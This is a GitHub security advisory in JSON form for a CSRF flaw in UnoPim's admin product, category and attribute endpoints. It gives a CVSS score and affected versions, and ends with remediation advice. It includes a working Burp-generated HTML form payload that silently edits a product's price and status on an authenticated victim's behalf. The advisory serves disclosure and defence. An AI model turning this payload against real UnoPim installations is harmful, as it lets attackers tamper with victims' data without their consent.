{
  "schema_version": "1.4.0",
  "id": "GHSA-287x-6r2h-f9mw",
  "modified": "2025-08-21T14:27:18Z",
  "published": "2025-08-21T14:27:18Z",
  "aliases": [
    "CVE-2025-55744"
  ],
  "summary": "UnoPim vulnerable to CSRF on Product edit feature and creation of other types",
  "details": "### Summary\nSome of the endpoints of the application is vulnerable to Cross site Request forgery (CSRF).\n| Method | Endpoint | Status   | Reason |\n|:------:|:------:|:------:|:------:|\n| POST | /admin/catalog/products/create | Not Vulnerable :white_check_mark: | `X-XSRF-TOKEN` header used |\n| GET | /admin/catalog/products/copy/{id}| Vulnerable :x: | Missing `X-XSRF-TOKEN` header or similar protection |\n| POST | /admin/catalog/products/edit/{id}| Vulnerable :x: | Missing `X-XSRF-TOKEN` header or similar protection |\n| POST | /admin/settings/users/create | Not Vulnerable :white_check_mark: | `X-XSRF-TOKEN` header used |\n\nThe below are some of the vulnerable endpoints that allow state changing actions including but not limited to:\n```\n/admin/catalog/categories/create\n/admin/catalog/categories/edit/{id}\n/admin/catalog/category-fields/create\n/admin/catalog/category-fields/edit/{id}\n/admin/catalog/attributes/create\n/admin/catalog/attributes/edit/{id}\n```\n\n### Details\nCSRF attack happens when you visit an attacker controlled website which sends a cross origin request to vulnerable application in order to perform a state changing operation like edit the price of a product without the intention of victim.\nIn this case, the POST request doesn't need any special headers ( X-XSRF-TOKEN header missing ) and the content-type is either `application/x-www-form-urlencoded` or `multipart/form-data` so we can say this is a `Simple request` ( doesn't need preflight request ).  The cookies are send because `samesite` is set to `None`. We have every ingredients for a successful CSRF attack.\n\n### PoC\n    1. Go to any product and click on Edit.\n    2. Capture the request on Burp, right click and generate a CSRF POC  ( or use the below csrf-poc.html )\n    3. Access the poc.html and press submit request, the cross origin request will be send and we can see the price of the product has been changed.\n\nPOC Video link: https://drive.proton.me/urls/VXNDKQ4WKR#LpvE777hl8OJ\n\n`csrf-poc.html`:\n```\n<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"http://127.0.0.1:8000/admin/catalog/products/edit/7\" method=\"POST\" enctype=\"multipart/form-data\">\n      <input type=\"hidden\" name=\"&#95;token\" value=\"s9Egihm0RD1Pd1NxhvTrx0a4qKCdl0UTSzyyJaK5\" />\n      <input type=\"hidden\" name=\"&#95;method\" value=\"PUT\" />\n      <input type=\"hidden\" name=\"sku\" value=\"SM&#45;BL&#45;102\" />\n      <input type=\"hidden\" name=\"channel\" value=\"default\" />\n      <input type=\"hidden\" name=\"locale\" value=\"en&#95;US\" />\n      <input type=\"hidden\" name=\"values&#91;common&#93;&#91;sku&#93;\" value=\"SM&#45;BL&#45;102\" />\n      <input type=\"hidden\" name=\"uniqueFields&#91;values&#46;common&#46;sku&#93;\" value=\"values&#91;common&#93;&#91;sku&#93;\" />\n      <input type=\"hidden\" name=\"values&#91;common&#93;&#91;product&#95;number&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"uniqueFields&#91;values&#46;common&#46;product&#95;number&#93;\" value=\"values&#91;common&#93;&#91;product&#95;number&#93;\" />\n      <input type=\"hidden\" name=\"values&#91;channel&#95;locale&#95;specific&#93;&#91;default&#93;&#91;en&#95;US&#93;&#91;name&#93;\" value=\"test\" />\n      <input type=\"hidden\" name=\"values&#91;common&#93;&#91;url&#95;key&#93;\" value=\"fffkk\" />\n      <input type=\"hidden\" name=\"uniqueFields&#91;values&#46;common&#46;url&#95;key&#93;\" value=\"values&#91;common&#93;&#91;url&#95;key&#93;\" />\n      <input type=\"hidden\" name=\"values&#91;channel&#95;specific&#93;&#91;default&#93;&#91;tax&#95;category&#95;id&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"values&#91;channel&#95;specific&#93;&#91;default&#93;&#91;tax&#95;category&#95;id&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"values&#91;common&#93;&#91;color&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"values&#91;common&#93;&#91;color&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"values&#91;common&#93;&#91;size&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"values&#91;common&#93;&#91;size&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"values&#91;common&#93;&#91;brand&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"values&#91;common&#93;&#91;brand&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"values&#91;channel&#95;locale&#95;specific&#93;&#91;default&#93;&#91;en&#95;US&#93;&#91;short&#95;description&#93;\" value=\"&lt;p&gt;fff&lt;&#47;p&gt;\" />\n      <input type=\"hidden\" name=\"values&#91;channel&#95;locale&#95;specific&#93;&#91;default&#93;&#91;en&#95;US&#93;&#91;description&#93;\" value=\"&lt;p&gt;fff&lt;&#47;p&gt;\" />\n      <input type=\"hidden\" name=\"values&#91;channel&#95;locale&#95;specific&#93;&#91;default&#93;&#91;en&#95;US&#93;&#91;meta&#95;title&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"values&#91;channel&#95;locale&#95;specific&#93;&#91;default&#93;&#91;en&#95;US&#93;&#91;meta&#95;keywords&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"values&#91;channel&#95;locale&#95;specific&#93;&#91;default&#93;&#91;en&#95;US&#93;&#91;meta&#95;description&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"values&#91;channel&#95;locale&#95;specific&#93;&#91;default&#93;&#91;en&#95;US&#93;&#91;price&#93;&#91;USD&#93;\" value=\"7&#46;777\" />\n      <input type=\"hidden\" name=\"values&#91;channel&#95;specific&#93;&#91;default&#93;&#91;cost&#93;&#91;USD&#93;\" value=\"\" />\n      <input type=\"hidden\" name=\"values&#91;common&#93;&#91;status&#93;\" value=\"false\" />\n      <input type=\"hidden\" name=\"values&#91;common&#93;&#91;status&#93;\" value=\"true\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n\n```\n\n### Impact\nAttacker can perform action on behalf of the victim as this happens on the victim's browser provide the victim is already authenticated to the application.\nAttacker can use an image tag to send the GET request such that when the page is loaded, it'll get executed.\nAs shown in the video POC, the product information can be tampered, create new categories etc.\n\n### Remediation:\n- Use CSRF token for every state changing request.\n- Use samesite: lax or strict, now it is set 'None'. Make sure all state changing requests are done using POST instead of GET. Noticed that for product copy feature, GET is used which means Samesite:strict needs to be set in that case. Otherwise Samesite: lax should suffice.",
  "severity": [
    {
      "type": "CVSS_V4",
      "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P"
    }
  ],
  "affected": [
    {
      "package": {
        "ecosystem": "Packagist",
        "name": "unopim/unopim"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "0.2.1"
            }
          ]
        }
      ],
      "database_specific": {
        "last_known_affected_version_range": "<= 0.2.0"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/unopim/unopim/security/advisories/GHSA-287x-6r2h-f9mw"
    },
    {
      "type": "WEB",
      "url": "https://drive.proton.me/urls/VXNDKQ4WKR#LpvE777hl8OJ"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/unopim/unopim"
    }
  ],
  "database_specific": {
    "cwe_ids": [
      "CWE-352"
    ],
    "severity": "MODERATE",
    "github_reviewed": true,
    "github_reviewed_at": "2025-08-21T14:27:18Z",
    "nvd_published_at": null
  }
}